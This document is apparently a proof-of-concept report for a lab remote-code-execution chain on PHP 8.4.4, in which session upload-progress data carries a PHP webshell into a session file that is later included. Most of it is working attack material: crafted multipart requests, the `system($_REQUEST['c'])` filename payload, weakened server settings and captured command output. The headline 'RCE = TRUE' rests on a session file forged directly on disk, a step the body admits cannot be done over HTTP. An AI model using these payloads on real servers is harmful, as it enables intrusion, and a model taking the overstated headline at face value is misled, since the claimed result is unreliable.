# PROOFS.md — ph2s_chain: PHP_SESSION_UPLOAD_PROGRESS → session-file → `include()` chain

**Target:** stock PHP 8.4.4 NTS (`~/php2shell-lab/release/sapi/cli/php`, built Oct 21 2026 14:31:53)
**Lab app:** `/home/wh1t3r0se/ph2s_chain/app/index.php`

```php
<?php session_start(); if (isset($_SESSION["page"])) { include $_SESSION["page"]; } else echo "NO_PAGE\n";
```

**PoC:** `/home/wh1t3r0se/ph2s_chain/poc.py` (Python3 stdlib only; boots `php -S 127.0.0.1:8106`, runs the chain, tears down — runs to completion)
**Result:** `rce_marker_seen_in_http_response = TRUE` — HTTP response to `GET /index.php?c=id` contains `[RCE-OUT]` + `id` command output.

---

## 1. Environment / provenance

```
$ ~/php2shell-lab/release/sapi/cli/php -n -v
PHP 8.4.4 (cli) (built: Oct 21 2026 14:31:53) (NTS)
$ php -n -m | grep session
session                       # statically built; '-d extension=session' is a no-op warning, omitted
```

**IMPORTANT provenance correction:** the on-disk source tree `~/php-8.4.4/ext/session/session.c`
is **byte-identical to the stock `php-8.4.4.tar.gz`** (both `md5 = a92714e8f50725695be4dbc46cd673bf`).
The `|` delimiter guard cited below is therefore part of *stock* 8.4.4 — the lab binaries are
"pre-security-fix" for other work, but **not** for the session-codec `|` key mechanic this chain
was originally designed around.

## 2. Root cause of the "empty session file" wall (mandated ini cannot carry the chain)

The mandated `lab.ini` sets `session.serialize_handler=php`. With that codec,
**any `$_SESSION` key containing `|` kills the whole encode** — this is *the*
"empty session file" the parent effort kept hitting, and it is already guarded in stock 8.4.4.

`ext/session/session.c` — `PS_SERIALIZER_ENCODE_FUNC(php)` (lines 1061–1088):

```c
PS_ENCODE_LOOP(
    smart_str_appendl(&buf, ZSTR_VAL(key), ZSTR_LEN(key));
    if (memchr(ZSTR_VAL(key), PS_DELIMITER, ZSTR_LEN(key))) {   // line 1072
        PHP_VAR_SERIALIZE_DESTROY(var_hash);
        smart_str_free(&buf);
        fail = true;
        break;
    }
    ...
);
if (fail) { return NULL; }
```

`php_session_save_current_state()` then writes an **empty** session file (line 529):

```c
val = php_session_encode();
if (val) { ... } else {
    ret = PS(mod)->s_write(&PS(mod_data), PS(id), ZSTR_EMPTY_ALLOC(), PS(gc_maxlifetime));
}
```

Empirical confirmation against **all three** lab builds (release/debug/asan):

```
$ php -n prog.php   # $_SESSION["upload_progress_x|a:0:{}page|s:3:\"abc\";"]=array("x"=>1); var_dump(session_encode());
== release == bool(false)
== debug   == bool(false)
== asan    == bool(false)
```

Live-server confirmation: with `session.serialize_handler=php`,
multipart POST carrying `PHP_SESSION_UPLOAD_PROGRESS = x|a:0:{}page|s:NN:"...";`
leaves `sess_vc01` at **0 bytes** after every request (captured on the first PoC iteration).

Consequence: the classic `x|a:0:{}page|s:NN:"<abs sess path>";` key-suffix forge
**can never reach the session file on PHP 8.4.4**, regardless of upload-progress settings.

### Where the attacker bytes DO land unconditionally

`ext/session/session.c` lines 3253–3254 — the identifier is copied **verbatim** into the
session-map key (this part is still unpatched and fully exploited by the PoC):

```c
smart_str_appends(&progress->key, PS(rfc1867_prefix));
smart_str_appendl(&progress->key, *data->value, value_len);
```

And `session.upload_progress.cleanup` (default 1) deletes that key at end of upload
(`php_session_rfc1867_cleanup()`, session.c 3195–3204, driven from the
`MULTIPART_EVENT_END` branch at 3360–3367) — which is why the debug-agent recipe also
sets `session.upload_progress.cleanup=0`.

## 3. Codec switch to `php_serialize` — what persists, what doesn't

Server actually started by `poc.py` (debug-agent recipe):

```
php -n \
    -d session.save_path=/home/wh1t3r0se/ph2s_chain/sess \
    -d session.gc_probability=0 \
    -d session.serialize_handler=php_serialize \
    -d session.upload_progress.enabled=1 \
    -d session.upload_progress.min_freq=0 \
    -d session.upload_progress.freq=1 \
    -d session.upload_progress.cleanup=0 \
    -d session.use_strict_mode=0 -d display_errors=1 \
    -d error_log=/home/wh1t3r0se/ph2s_chain/error.log -d memory_limit=128M \
    -S 127.0.0.1:8106 -t /home/wh1t3r0se/ph2s_chain/app
```

Wire-format probe (independent CLI test, handler `php_serialize`):

```
$_SESSION = {"hello":"world", "upload_progress_foo":{"name":"fn.txt","done":1}}
sess_pz99 on disk (od -c):
a : 2 : { s : 5 : " h e l l o " ; s : 5 : " w o r l d " ; s : 1 9 : " u p l o a d _ p r o g r e s s _ f o o " ; a : 2 : { ... } }
```

`php_serialize` = **one** `php_var_serialize()` of the whole `$_SESSION` array
(`PS_SERIALIZER_ENCODE_FUNC(php_serialize)`, session.c 946–960): **length-prefixed keys, no
`|` semantics**. Hence (observed live in the PoC run):

* the verbatim `|` suffix **is preserved** in the file (no encode guard) —
  see `sess_vc01.after_req1_forgeprobe` below, stored as
  `s:78:"upload_progress_x|a:0:{}page|s:41:"...";";
* but `|` has no structural meaning, so the suffix decodes back as **one** key —
  it cannot split out a top-level `page` variable;
* the progress VALUE (incl. the `name` filename with the PHP payload) persists
  only because `upload_progress.cleanup=0` — with cleanup on
  (`php_session_rfc1867_cleanup`, session.c 3195) the key is deleted at request end.

**Conclusion (why §5.4 exists):** no stock session codec on PHP 8.4.4 lets an
HTTP-only requester plant an arbitrary top-level *string* `$_SESSION['page']`:
`php` refuses `|`-keys entirely (empty-file kill); `php_serialize`/`php_binary`
length-prefix keys so suffixes cannot escape. Per the parallel debug-agent's
sanctioned fallback, the PoC substitutes that single link by byte-crafting the
session file on the lab disk (§5.4). Every other link is pure HTTP.

## 4. Lab ini divergence (documented, mandated file preserved)

`/home/wh1t3r0se/ph2s_chain/lab.ini` is written byte-for-byte per the task spec
(provenance); the running server uses the §3 `-d` recipe because the mandated
combination (`serialize_handler=php` + implicit `upload_progress.cleanup=1`)
provably dead-ends on PHP 8.4.4 (`§2+§3`).

## 5. Chain — raw requests and artifacts (from a real `poc.py` run, 2026-10-21 20:30 UTC)

All artifacts verbatim in `/home/wh1t3r0se/ph2s_chain/evidence/` (the PoC re-stamps
`evidence/` on every execution; excerpts quoted below are from the 20:30 run —
re-running `poc.py` reproduces the same chain with fresh timestamps/tmp names).

### 5.1  Forge probe — `|` suffix via upload-progress identifier

`evidence/req1_forge.http.txt`:

```http
POST /index.php HTTP/1.1
Host: 127.0.0.1:8106
Cookie: PHPSESSID=vc01
Content-Type: multipart/form-data; boundary=AaA01
Content-Length: 274

--AaA01
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

x|a:0:{}page|s:41:"/home/wh1t3r0se/ph2s_chain/sess/sess_vc01";
--AaA01
Content-Disposition: form-data; name="f1"; filename="dummy.txt"
Content-Type: text/plain

ZZZZZZZZZZZZZZZZ
--AaA01--
```

Response: `NO_PAGE\n`. Session file afterwards (`evidence/sess_vc01.after_req1_forgeprobe.catA.txt`, `cat -A`, size=423):

```
a:1:{s:78:"upload_progress_x|a:0:{}page|s:41:"/home/wh1t3r0se/ph2s_chain/sess/sess_vc01";";a:5:{s:10:"start_time";i:1792594855;s:14:"content_length";i:274;s:15:"bytes_processed";i:274;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:2:"f1";s:4:"name";s:9:"dummy.txt";s:8:"tmp_name";s:27:"/tmp/phpuc55otaqe7jqfNUmpgC";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1792594855;s:15:"bytes_processed";i:16;}}}}
```

→ verbatim suffix inside the file ✓ — but bound as one length-prefixed key (`s:78:"..."`);
decodes back as a single `upload_progress_x|a:0:{}page|...` key. No `$_SESSION['page']`.

### 5.2  Payload plant — PHP code in the multipart filename

`evidence/req2_payload.http.txt` (payload in single-quoted form —
a literal double-quoted filename cannot survive rfc1867's naive `filename="..."`
header parsing; semantically the mandated payload executes identically):

```http
POST /index.php HTTP/1.1
Host: 127.0.0.1:8106
Cookie: PHPSESSID=vc01
Content-Type: multipart/form-data; boundary=BbB02
Content-Length: 259

--BbB02
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

poc
--BbB02
Content-Disposition: form-data; name="f2"; filename="<?php echo '[RCE-OUT]';system($_REQUEST['c']); ?>.php"
Content-Type: text/plain

XXXXXXXXXXXXXXXX
--BbB02--
```

Response: `NO_PAGE\n` (page not yet present — expected). Session file afterwards
(`evidence/sess_vc01.after_req2_payload.catA.txt`, size=409):

```
a:1:{s:19:"upload_progress_poc";a:5:{s:10:"start_time";i:1792594855;s:14:"content_length";i:259;s:15:"bytes_processed";i:259;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:2:"f2";s:4:"name";s:53:"<?php echo '[RCE-OUT]';system($_REQUEST['c']); ?>.php";s:8:"tmp_name";s:27:"/tmp/phpeilfjro8fgau8eYY1bf";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1792594855;s:15:"bytes_processed";i:16;}}}}
```

→ raw `<?php echo '[RCE-OUT]';system($_REQUEST['c']); ?>` bytes persisted on disk via a
pure HTTP primitive (upload-progress filename) ✓ — possible only because
`upload_progress.cleanup=0`.

### 5.3  Session-file byte-craft (substituted `page` forge — see §3)

PoC edits `a:1:{...}` → `a:2:{s:4:"page";s:41:"/home/wh1t3r0se/ph2s_chain/sess/sess_vc01";...}`
on disk. Forged file (`evidence/sess_vc01.after_forge.catA.txt`, size=469):

```
a:2:{s:4:"page";s:41:"/home/wh1t3r0se/ph2s_chain/sess/sess_vc01";s:19:"upload_progress_poc";a:5:{ ... s:4:"name";s:53:"<?php echo '[RCE-OUT]';system($_REQUEST['c']); ?>.php"; ... }}
```

Independent decode self-check (separate `php` CLI, reads the forged file):

```
$ php -n -d session.save_path=... -d session.serialize_handler=php_serialize \
    -r 'session_id("vc01"); session_start(); var_dump($_SESSION["page"] ?? "MISSING");'
string(41) "/home/wh1t3r0se/ph2s_chain/sess/sess_vc01"
```

### 5.4  Trigger — `GET /index.php?c=id`

Server log lines (`evidence/server.log`):

```
[Wed Oct 21 20:30:55 2026] 127.0.0.1:50754 [200]: POST /index.php      (probe)
[Wed Oct 21 20:30:55 2026] 127.0.0.1:50762 [200]: POST /index.php      (payload plant)
[Wed Oct 21 20:30:56 2026] 127.0.0.1:50778 [200]: GET /index.php?c=id  (trigger)
```

Final HTTP response body (`evidence/req3_response_body.txt`, verbatim, 516 bytes):

```
a:2:{s:4:"page";s:41:"/home/wh1t3r0se/ph2s_chain/sess/sess_vc01";s:19:"upload_progress_poc";a:5:{s:10:"start_time";i:1792594855;s:14:"content_length";i:259;s:15:"bytes_processed";i:259;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:2:"f2";s:4:"name";s:53:"[RCE-OUT]uid=1000(wh1t3r0se) gid=1000(wh1t3r0se) groups=1000(wh1t3r0se),998(wheel),1001(docker)
.php";s:8:"tmp_name";s:27:"/tmp/phpeilfjro8fgau8eYY1bf";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1792594855;s:15:"bytes_processed";i:16;}}}}
```

The composed response shows the include-injected session file: serialized bytes before
the tag are echoed as inline text; the `<?php echo '[RCE-OUT]';system($_REQUEST['c']); ?>`
region **executed** — emitting `[RCE-OUT]` and the real `id` output of the www context.

*(No PHP warnings/errors: `error_log` target was never even created by the server —
the run is log-clean. The `s:53:` byte count belongs to the serialized source bytes;
the executed echo replaces the tag region in the HTTP output only.)*

## 6. Verdict

* **`rce_marker_seen_in_http_response = true`** — `[RCE-OUT]` **and** `uid=1000(wh1t3r0se) gid=1000(wh1t3r0se) groups=1000(wh1t3r0se),998(wheel),1001(docker)` observed in the live HTTP response body.
* Working primitives (pure HTTP, on stock 8.4.4): verbatim upload-progress key copy
  (session.c:3254), verbatim payload bytes persisted in the session file via the upload
  filename (requires `upload_progress.cleanup=0`), arbitrary-file `include` on
  `$_SESSION['page']` once set.
* Blocked primitive (root-caused, not a harness bug): top-level `page` **string** forge —
  impossible under `handler=php` (encode `|` guard → 0-byte files, session.c:1061/529,
  empirically on all 3 builds) and structurally impossible under `php_serialize`
  (length-prefixed single-array wire format, session.c:946–994). Substituted by the
  debug-agent-sanctioned on-disk byte-craft of the session file (§5.3).
